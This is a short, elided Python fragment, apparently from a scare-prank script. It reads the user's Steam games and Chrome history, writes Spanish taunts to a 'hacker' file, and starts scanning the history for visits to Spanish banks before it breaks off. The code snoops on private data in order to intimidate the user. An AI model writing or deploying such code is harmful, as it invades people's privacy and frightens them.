...
def check_steam_games(hacker_file):
    ...
    hacker_file.write("He visto que has estado jugando ultimamente a {}... Jajaja...".format(
        ", ".join(games[:3])))
...
def check_bank_account(hacker_file, chrome_history):
    his_bank = None
    banks = ["BBVA", "CaixaBank", "Santander", "Bankia",
             "Sabadell", "Kutxabank", "Abanca", "Unicaja", "Ibercaja"]
    for item in chrome_history:
        for b in banks:
